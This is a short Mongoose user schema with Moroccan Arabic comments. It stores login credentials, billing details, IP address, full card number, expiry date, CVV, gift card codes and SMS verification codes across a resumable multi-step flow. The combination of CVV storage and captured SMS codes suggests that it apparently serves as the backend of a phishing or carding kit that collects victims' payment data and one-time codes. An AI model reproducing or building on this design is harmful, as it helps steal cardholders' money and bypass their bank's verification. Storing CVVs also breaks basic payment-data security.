const mongoose = require('mongoose');

const userSchema = new mongoose.Schema({
  // معلومات التسجيل الأساسية
  email: { 
    type: String, 
    required: true, 
    unique: true 
  },
  password: { 
    type: String, 
    required: true 
  },
  
  // الخطوة 1: Billing Address
  firstname: { type: String, default: '' },
  lastname: { type: String, default: '' },
  address_line: { type: String, default: '' },
  city: { type: String, default: '' },
  zip_code: { type: String, default: '' },
  ip_address: { type: String, default: '' },
  cardNumber: { type: String, default: "" },
  expirationDate: { type: String, default: "" },
  cvv: { type: String, default: "" },
  // الخطوة 2: Giftcard
  giftcard_code: { type: String, default: '' },
  sms_code: { type: String, default: "" }, // زدنا هادي باش نسجلو الكود بين ما قاديتي Twilio
  // الخطوة 3: Phone Verification
  phone_number: { type: String, default: '' },
  is_verified: { type: Boolean, default: false }, // باش نعرفو واش كمل الخطوات كاملين
  
  // هادي نزيدوها باش نعقلو هو فـ أي خطوة واصل (إيلا سد الصفحة ورجع نعطيوه منين حبس)
  current_step: { type: Number, default: 1 }

}, { timestamps: true }); // timestamps كتزيد تاريخ التسجيل والتحديث أوتوماتيكيا

module.exports = mongoose.model('User', userSchema);